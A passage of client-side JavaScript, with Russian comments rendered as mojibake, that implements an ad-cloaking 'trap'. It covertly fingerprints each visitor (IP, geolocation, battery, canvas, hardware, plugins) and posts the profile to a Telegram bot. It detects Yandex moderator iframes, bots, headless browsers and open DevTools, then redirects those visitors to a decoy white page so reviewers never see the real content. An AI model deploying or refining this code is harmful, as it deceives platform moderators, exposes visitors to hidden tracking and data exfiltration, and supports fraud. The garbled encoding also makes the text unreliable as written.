                                   logDebug("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:", e);
                                   return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
                               });
                    }
                    return Promise.resolve("–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ (IP –Ω–µ –Ω–∞–π–¥–µ–Ω)");
                });

                // –°–æ–±–∏—Ä–∞–µ–º —Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                info = {
                    timestamp: new Date().toISOString(),
                    userAgent: userAgent,
                    language: navigator.language,
                    languages: navigator.languages ? navigator.languages.join(',') : "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                    platform: navigator.platform,
                    deviceType: isMobile ? '–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ' : '–î–µ—Å–∫—Ç–æ–ø',
                    visitCount: visitCount,
                    screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio || 1 },
                    window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight },
                    url: window.location.href,
                    referrer: document.referrer || "none", // –ö–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ
                    cookiesEnabled: navigator.cookieEnabled,
                    localStorage: !!window.localStorage,
                    sessionStorage: !!window.sessionStorage,
                    hardwareConcurrency: navigator.hardwareConcurrency || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                    memory: getDeviceMemory(),
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    connection: getConnectionInfo(),
                    doNotTrack: navigator.doNotTrack || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                    webdriver: !!navigator.webdriver,
                    plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ" : "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                    canvas: getCanvasFingerprint(),
                    hadMouseMovement: hadMouseMovement,
                    botTrapActivated: botTrapActivated,
                    // –ó–∞–ø–æ–ª–Ω—è—Ç—Å—è –ø–æ—Å–ª–µ await
                    battery: "–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ...",
                    ipAddress: "–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ...",
                    geolocation: "–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ...",
                    loadTime: 0
                };

                // –î–æ–∂–∏–¥–∞–µ–º—Å—è –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã—Ö —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
                info.ipAddress = await ipPromise;
                info.battery = await batteryPromise;
                info.geolocation = await geoPromise; // –£–∂–µ —Å–æ–¥–µ—Ä–∂–∏—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∏–ª–∏ "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ"

            } catch (error) {
                console.error("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏:", error);
                logDebug("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏:", error);
                info = { ...info, error: `–°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –Ω–µ —É–¥–∞–ª—Å—è: ${error.message}` }; // –î–æ–±–∞–≤–ª—è–µ–º –æ—à–∏–±–∫—É –≤ –æ–±—ä–µ–∫—Ç
            } finally {
                info.loadTime = Math.round(performance.now() - PAGE_LOAD_START); // –í—Ä–µ–º—è –∑–∞–≥—Ä—É–∑–∫–∏ –≤ –∫–æ–Ω—Ü–µ
                logDebug(`–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –∑–∞–≤–µ—Ä—à–µ–Ω –∑–∞ ${Math.round(performance.now() - startTime)} –º—Å.`);
                userInfo = info; // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≥–ª–æ–±–∞–ª—å–Ω–æ
                return info;
            }
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç—á–µ—Ç–∞ –≤ Telegram (—Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ)
        async function sendTelegramReport(reason, data) {
            if (!config.common.TelegramReporting) {
                logDebug("–û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç—á–µ—Ç–æ–≤ –≤ Telegram –æ—Ç–∫–ª—é—á–µ–Ω–∞.");
                return false;
            }
            if (!data) {
                logDebug("–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç—á–µ—Ç–∞.");
                return false;
            }

            logDebug(`–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –æ—Ç—á–µ—Ç–∞ –¥–ª—è Telegram. –ü—Ä–∏—á–∏–Ω–∞: ${reason}`);

            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ
            let message = `ü™§ –ö–õ–û–ê–ö–ê: –õ–û–í–£–®–ö–ê –°–†–ê–ë–û–¢–ê–õ–ê\n\n`;
            message += `‚ö†Ô∏è –ü—Ä–∏—á–∏–Ω–∞: ${reason}\n\n`;
            message += `üì± –¢–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${data.deviceType || 'N/A'}\n`;
            message += `üî¢ –°—á–µ—Ç—á–∏–∫ –ø–æ—Å–µ—â–µ–Ω–∏–π: ${data.visitCount || 'N/A'}\n`;
            message += `üåê IP: ${data.ipAddress || 'N/A'}\n`;
            message += `üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: ${data.geolocation || 'N/A'}\n`;
            message += `üñ•Ô∏è User-Agent: ${data.userAgent || 'N/A'}\n`;
            message += `üìè –≠–∫—Ä–∞–Ω: ${data.screen?.width || '?'}x${data.screen?.height || '?'} (${data.screen?.pixelRatio || '?'}x)\n`;
            message += `‚è±Ô∏è –í—Ä–µ–º—è –∑–∞–≥—Ä—É–∑–∫–∏: ${data.loadTime || '?'}–º—Å\n`;
            message += `üîó URL: ${data.url || 'N/A'}\n`;
            message += `‚Ü©Ô∏è Referrer: ${data.referrer || 'N/A'}\n\n`;
            message += `üñ±Ô∏è –î–≤–∏–∂–µ–Ω–∏–µ –º—ã—à–∏: ${data.hadMouseMovement ? 'yes' : 'no'}\n`;
            const batteryInfo = typeof data.battery === 'object'
                ? `–ó–∞—Ä—è–¥: ${data.battery.level}%, –ó–∞—Ä—è–∂–∞–µ—Ç—Å—è: ${data.battery.charging ? '–¥–∞' : '–Ω–µ—Ç'}`
                : (data.battery || 'N/A');
            message += `üîã –ë–∞—Ç–∞—Ä–µ—è: ${batteryInfo}\n`;
            message += `üß† –Ø–¥—Ä–∞ CPU: ${data.hardwareConcurrency || 'N/A'}\n`;
            message += `üíæ –ü–∞–º—è—Ç—å: ${data.memory || 'N/A'}\n`;
            message += `üåç –Ø–∑—ã–∫: ${data.language || 'N/A'}\n`;
            message += `‚è∞ –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${data.timeZone || 'N/A'}\n`;
            const connectionInfo = typeof data.connection === 'object'
                ? `${data.connection.type} (RTT: ${data.connection.rtt})`
                : (data.connection || 'N/A');
            message += `üîå –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ: ${connectionInfo}\n`;
            message += `ü§ñ WebDriver: ${data.webdriver ? 'yes' : 'no'}\n`;
            message += `üé® Canvas: ${data.canvas || 'N/A'}`;
            if (data.error) {
                message += `\n\nüÜò –û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞: ${data.error}`;
            }

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                // parse_mode: 'Markdown' // –ö–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ, –Ω–æ –º–æ–∂–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å –æ—à–∏–±–∫–∏, –µ—Å–ª–∏ —Å–∏–º–≤–æ–ª—ã –Ω–µ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω—ã
            };

            try {
                logDebug("–û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –≤ Telegram...");
                // –ò—Å–ø–æ–ª—å–∑—É–µ–º fetch –∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ, –Ω–æ —Å —Ç–∞–π–º–∞—É—Ç–æ–º
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 —Å–µ–∫ —Ç–∞–π–º–∞—É—Ç

                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    signal: controller.signal
                });
                 clearTimeout(timeoutId);

                if (!response.ok) {
                    // –ü–æ–ø—ã—Ç–∫–∞ –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Ç–µ–ª–æ –æ—à–∏–±–∫–∏
                    let errorData = { description: 'Unknown error' };
                    try { errorData = await response.json(); } catch (e) {}
                    throw new Error(`Telegram API error: ${response.status} - ${errorData.description}`);
                }
                logDebug("–û—Ç—á–µ—Ç —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram.");
                return true;

            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –æ—Ç—á–µ—Ç–∞ –≤ Telegram:", error);
                logDebug("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –æ—Ç—á–µ—Ç–∞ –≤ Telegram:", error.message);
                // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å —Ä–µ–∑–µ—Ä–≤–Ω—É—é –æ—Ç–ø—Ä–∞–≤–∫—É —á–µ—Ä–µ–∑ XMLHttpRequest, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
                return false;
            }
        }

        // ===== –§–£–ù–ö–¶–ò–ò –ü–†–û–í–ï–†–û–ö (–ª–æ–≥–∏–∫–∞ –∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞ –∏ —É–ª—É—á—à–µ–Ω–∏–π) =====

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ø–Ω–¥–µ–∫—Å–∞
        function isRegularYandexUser() {
            const result = YANDEX_REGULAR_APPS.some(pattern => pattern.test(userAgent));
            // logDebug(`isRegularYandexUser: ${result}`); // –†–∞—Å–∫–æ–º–º–µ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å –¥–ª—è –¥–µ—Ç–∞–ª—å–Ω–æ–π –æ—Ç–ª–∞–¥–∫–∏
            return result;
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø–æ–∏—Å–∫–æ–≤–æ–≥–æ –±–æ—Ç–∞ –ø–æ UA (—Å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º –æ–±—ã—á–Ω—ã—Ö –Ø.–Æ–∑–µ—Ä–æ–≤)
        function isSearchBotUA() {
            if (isRegularYandexUser()) return false;
            const result = SEARCH_BOT_AGENTS.some(pattern => pattern.test(userAgent));
            logDebug(`isSearchBotUA: ${result} (UA: ${userAgent.substring(0, 70)}...)`);
            return result;
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ headless-–±—Ä–∞—É–∑–µ—Ä–∞ (–∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞)
        function isHeadlessBrowser() {
            if (isRegularYandexUser()) return false;

            let headless = false;
            let reason = '';

            if (navigator.webdriver) { headless = true; reason = 'navigator.webdriver'; }
            else if (window.domAutomation || window.domAutomationController) { headless = true; reason = 'window.domAutomation'; }
            else if (window._phantom || window.callPhantom) { headless = true; reason = 'PhantomJS'; }
            else if (document.documentElement.getAttribute('webdriver') || document.documentElement.getAttribute('selenium') || document.documentElement.getAttribute('driver')) { headless = true; reason = 'documentElement attribute'; }
            else if (userAgent.includes('HeadlessChrome') || userAgent.includes('Headless Firefox')) { headless = true; reason = 'UA contains Headless'; }
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–ª–∞–≥–∏–Ω–æ–≤ –∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞
            else if (navigator.plugins && navigator.plugins.length === 0 && !isMobile) {
                 // –£ –Ø–Ω–¥–µ–∫—Å –ë—Ä–∞—É–∑–µ—Ä–∞ –∏ –¥—Ä—É–≥–∏—Ö –º–æ–≥—É—Ç –±—ã—Ç—å —Å–≤–æ–∏ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏ —Å –ø–ª–∞–≥–∏–Ω–∞–º–∏
                 const uaLower = userAgent.toLowerCase();
                 if (!uaLower.includes('yabrowser') && !uaLower.includes('yandex') && !uaLower.includes('dzen')) {
                     headless = true; reason = 'navigator.plugins.length === 0';
                 }
            }
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ —è–∑—ã–∫–æ–≤ –∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞
            else if (navigator.languages && navigator.languages.length === 0) {
                 headless = true; reason = 'navigator.languages.length === 0';
            }
            // –î–æ–±–∞–≤–ª–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ Permissions API –∏–∑ —É–ª—É—á—à–µ–Ω–Ω–æ–π –≤–µ—Ä—Å–∏–∏
             else if (config.experimental.CheckPermissionsAPI && typeof navigator.permissions?.query === 'function') {
                try {
                    navigator.permissions.query({ name: 'notifications' }).then(status => {
                        if (status.state === 'prompt' && !isMobile && !userAgent.includes('Firefox')) {
                            logDebug("–ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π —Å—Ç–∞—Ç—É—Å Permissions API:", status.state);
                            // –ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–∞–∫ –¥–æ–ø. —Å–∏–≥–Ω–∞–ª, –Ω–æ –Ω–µ –¥–µ–ª–∞–µ–º headless = true —Å—Ä–∞–∑—É
                        }
                    });
                } catch (e) { headless = true; reason = 'Permissions API error'; }
            }


            logDebug(`isHeadlessBrowser: ${headless} ${reason ? `(–ü—Ä–∏—á–∏–Ω–∞: ${reason})` : ''}`);
            return headless;
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏ –Ø–Ω–¥–µ–∫—Å–∞ (–∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞)
        function hasYandexModeratorIframe() {
            const iframes = document.querySelectorAll('iframe');
            for (const iframe of iframes) {
                const src = iframe.src || '';
                if (src.includes('iframe-yang.yandex') || src.includes('yandex.ru/iframe/mod') || src.includes('webvisor.com/mod') || src.includes('yandex.ru/moderation')) {
                    logDebug("–û–±–Ω–∞—Ä—É–∂–µ–Ω iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏ –Ø–Ω–¥–µ–∫—Å–∞ (–ø–æ src).");
                    return true;
                }
            }
            if (typeof window.YaModerator !== 'undefined' || typeof window.YaModeration !== 'undefined') {
                 logDebug("–û–±–Ω–∞—Ä—É–∂–µ–Ω JS-–æ–±—ä–µ–∫—Ç –º–æ–¥–µ—Ä–∞—Ü–∏–∏ –Ø–Ω–¥–µ–∫—Å–∞.");
                 return true;
            }
            return false;
        }

        // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –Ω–∞–±–ª—é–¥–∞—Ç–µ–ª—è –∑–∞ DOM –¥–ª—è iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏ (–∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞)
        function setupModerationFrameObserver() {
            if (typeof MutationObserver === 'undefined') return;
            try {
                const observer = new MutationObserver((mutations) => {
                    for (const mutation of mutations) {
                        if (mutation.type === 'childList') {
                            for (const node of mutation.addedNodes) {
                                if (node.tagName === 'IFRAME') {
                                    const src = node.src || '';
                                    if (src.includes('iframe-yang.yandex') || src.includes('yandex.ru/iframe/mod') || src.includes('webvisor.com/mod') || src.includes('yandex.ru/moderation')) {
                                        logDebug("–û–±–Ω–∞—Ä—É–∂–µ–Ω –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–ª–µ–Ω–Ω—ã–π iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏!");
                                        if (!botTrapActivated && !redirectInitiated) { // –î–æ–±–∞–≤–∏–ª !redirectInitiated
                                            botTrapActivated = true;
                                            blockReason = "–û–±–Ω–∞—Ä—É–∂–µ–Ω iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏ (–¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏)"; // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—Ä–∏—á–∏–Ω—É
                                            // –ù–µ–º–µ–¥–ª–µ–Ω–Ω–æ –ø—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—Ç—á–µ—Ç –∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç–Ω—É—Ç—å
                                            determineRedirectTarget().then(target => {
                                                // –†–µ–¥–∏—Ä–µ–∫—Ç–∏–º —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ —Ü–µ–ª—å - WHITE_PAGE (—á—Ç–æ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —Ç–∞–∫)
                                                if (target === WHITE_PAGE) redirect(WHITE_PAGE);
                                            });
                                        }
                                    }
                                }
                            }
                        }
                    }
                });
                observer.observe(document.body, { childList: true, subtree: true });
                logDebug("–ù–∞–±–ª—é–¥–∞—Ç–µ–ª—å –∑–∞ iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.");
            } catch (e) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ –Ω–∞–±–ª—é–¥–∞—Ç–µ–ª—è –∑–∞ iframe:", e);
            }
        }

        // –ö–æ–º–ø–ª–µ–∫—Å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –±–æ—Ç–∞ –Ø–Ω–¥–µ–∫—Å–∞ (–∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞, —Å –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–º IP)
        async function isYandexBot() {
            if (isRegularYandexUser()) return false;

            // 1. –ü—Ä–æ–≤–µ—Ä–∫–∞ User-Agent –Ω–∞ —è–≤–Ω—ã—Ö –±–æ—Ç–æ–≤
            if (strictYandexBotPattern.test(userAgent)) {
                logDebug("isYandexBot: true (–ø–æ strict UA pattern)");
                return true;
            }

            // 2. –ü—Ä–æ–≤–µ—Ä–∫–∞ iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏
            if (hasYandexModeratorIframe()) {
                 logDebug("isYandexBot: true (–ø–æ iframe –º–æ–¥–µ—Ä–∞—Ü–∏–∏)");
                 return true;
            }

            // 3. –ü—Ä–æ–≤–µ—Ä–∫–∞ IP –∏ DNS (–µ—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω–æ –∏ –µ—Å—Ç—å IP)
            const shouldCheckIp = config.desktop.CheckYandexBot || config.mobile.CheckYandexBot;
            const currentIp = userInfo?.ipAddress; // –ë–µ—Ä–µ–º —É–∂–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã–π IP
            if (shouldCheckIp && currentIp && currentIp !== "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ" && (/yandex/i.test(userAgent) || /bot|crawler|spider/i.test(userAgent))) {
                logDebug("isYandexBot: –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ IP –Ø–Ω–¥–µ–∫—Å–∞...");
                try {
                    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ DNS —á–µ—Ä–µ–∑ Google DNS (–∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ)
                    const controllerDNS = new AbortController();
                    const timeoutDNS = setTimeout(() => controllerDNS.abort(), 2000); // 2 —Å–µ–∫ —Ç–∞–π–º–∞—É—Ç
                    const responseDNS = await fetch(`https://dns.google/resolve?name=${currentIp.split('.').reverse().join('.')}.in-addr.arpa&type=PTR`, { signal: controllerDNS.signal });
                    clearTimeout(timeoutDNS);
                    if (responseDNS.ok) {
                        const dataDNS = await responseDNS.json();
                        if (dataDNS.Answer && dataDNS.Answer.some(ans => YANDEX_DOMAINS.some(domain => ans.data.includes(domain)))) {
                            logDebug("isYandexBot: true (–ø–æ –æ–±—Ä–∞—Ç–Ω–æ–º—É DNS)");
                            return true;
                        }
                    }

                    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ –ø–æ IP (–∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ)
                    const controllerOrg = new AbortController();
                    const timeoutOrg = setTimeout(() => controllerOrg.abort(), 2000); // 2 —Å–µ–∫ —Ç–∞–π–º–∞—É—Ç
                    const orgResponse = await fetch(`https://ipapi.co/${currentIp}/org/`, { signal: controllerOrg.signal });
                     clearTimeout(timeoutOrg);
                    if (orgResponse.ok) {
                        const org = await orgResponse.text();
                        if (org && org.toLowerCase().includes('yandex')) {
                            logDebug("isYandexBot: true (–ø–æ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ IP)");
                            return true;
                        }
                        logDebug(`–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è IP: ${org}`);
                    }
                } catch (e) {
                    logDebug("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ IP –Ø–Ω–¥–µ–∫—Å–∞:", e.name === 'AbortError' ? 'Timeout' : e);
                }
            }

            logDebug("isYandexBot: false (–ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–µ –≤—ã—è–≤–∏–ª–∏)");
            return false;
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞, –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –ª–∏ IP –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ (–∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞)
        async function isIpBlocked() {
            const currentIp = userInfo?.ipAddress;
            if (!currentIp || currentIp === "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ") return false;

            try {
                const blacklistText = await loadFile('blckip.txt');
                if (!blacklistText) return false;

                const blockedIps = blacklistText.split('\n').map(ip => ip.trim()).filter(ip => ip);
                const result = blockedIps.includes(currentIp);
                logDebug(`isIpBlocked: ${result} (IP: ${currentIp})`);
                return result;
            } catch (e) {
                logDebug("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —á–µ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ IP:", e);
                return false;
            }
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–∞/—Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞ (–∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞)
        function isLikelyModerator() {
            // –ü—Ä–æ–≤–µ—Ä–∫–∞ DevTools –ø–æ —Ä–∞–∑–º–µ—Ä—É –æ–∫–Ω–∞
            const isYandexRegularUser = isRegularYandexUser(); // –£—á–∏—Ç—ã–≤–∞–µ–º –Ø.–ë—Ä–∞—É–∑–µ—Ä
            const minWidthDiff = isYandexRegularUser ? 150 : 100;
            const minHeightDiff = isYandexRegularUser ? 150 : 100;

            if (window.outerWidth - window.innerWidth > minWidthDiff ||
                window.outerHeight - window.innerHeight > minHeightDiff) {
                logDebug("isLikelyModerator: true (–ø–æ —Ä–∞–∑–º–µ—Ä—É –æ–∫–Ω–∞)");
                return true;
            }

            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ WebDriver
            if (navigator.webdriver) {
                 logDebug("isLikelyModerator: true (–ø–æ navigator.webdriver)");
                 return true;
            }

            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –¥–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤
            if (typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined' ||
                typeof window.__REDUX_DEVTOOLS_EXTENSION__ !== 'undefined' ||
                typeof window.__VUE_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined') { // –î–æ–±–∞–≤–∏–ª Vue
                 logDebug("isLikelyModerator: true (–ø–æ DevTools Extensions)");
                return true;
            }

            // –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è console.log (timing attack)
            let slowConsole = false;
            if (!isYandexRegularUser && config.experimental.PerformTimingAttacks) { // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–ª–∞–≥ –∫–æ–Ω—Ñ–∏–≥–∞
                try {
                    const start = performance.now();
                    // –ò—Å–ø–æ–ª—å–∑—É–µ–º console.debug –∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ
                    for(let i = 0; i < 1000; i++) { console.debug(''); }
                    console.clear();
                    const end = performance.now();
                    // –ü–æ—Ä–æ–≥ –∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞ - 5–º—Å, –Ω–æ –æ–Ω –æ—á–µ–Ω—å –Ω–∏–∑–∫–∏–π, –ª—É—á—à–µ 15-20
                    if (end - start > 20) { // –£–≤–µ–ª–∏—á–∏–ª –ø–æ—Ä–æ–≥
                        slowConsole = true;
                        logDebug(`isLikelyModerator: true (–ø–æ –º–µ–¥–ª–µ–Ω–Ω–æ–π –∫–æ–Ω—Å–æ–ª–∏: ${end - start}ms)`);
                    }
                } catch(e) { /* –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –∫–æ–Ω—Å–æ–ª–∏ */ }
            }

            logDebug(`isLikelyModerator: ${slowConsole}`);
            return slowConsole;
        }

        // ===== –≠–ö–°–ü–ï–†–ò–ú–ï–ù–¢–ê–õ–¨–ù–´–ï –ü–†–û–í–ï–†–ö–ò (–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞) =====

        /**
         * –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –±–ª–æ–∫–∏—Ä–æ–≤—â–∏–∫–∞ —Ä–µ–∫–ª–∞–º—ã
         */
        function detectAdblocker() {
            if (!config.experimental.CheckAdBlocker) return false;
            logDebug("–ü—Ä–æ–≤–µ—Ä–∫–∞ AdBlock...");
            let isBlocked = false;
            try {
                const testAd = document.createElement('div');
                testAd.innerHTML = '&nbsp;';
                // –ö–ª–∞—Å—Å—ã, —á–∞—Å—Ç–æ –±–ª–æ–∫–∏—Ä—É–µ–º—ã–µ AdBlock/uBlock
                testAd.className = 'adsbox ad ad-banner banner_ad ad-container textads';
                testAd.style.position = 'absolute';
                testAd.style.left = '-9999px';
                testAd.style.height = '1px'; // –ó–∞–¥–∞–µ–º –≤—ã—Å–æ—Ç—É, —á—Ç–æ–±—ã offsetHeight –±—ã–ª > 0
                document.body.appendChild(testAd);

                // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å–∫—Ä—ã—Ç –ª–∏ —ç–ª–µ–º–µ–Ω—Ç –∏–ª–∏ –µ–≥–æ –≤—ã—Å–æ—Ç–∞ = 0
                isBlocked = !testAd.offsetHeight || testAd.style.display === 'none' || testAd.style.visibility === 'hidden';
                document.body.removeChild(testAd);
                logDebug(`detectAdblocker: ${isBlocked}`);
            } catch (e) {
                logDebug("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ AdBlock:", e);
                isBlocked = false; // –°—á–∏—Ç–∞–µ–º, —á—Ç–æ –Ω–µ—Ç, –µ—Å–ª–∏ –æ—à–∏–±–∫–∞
            }
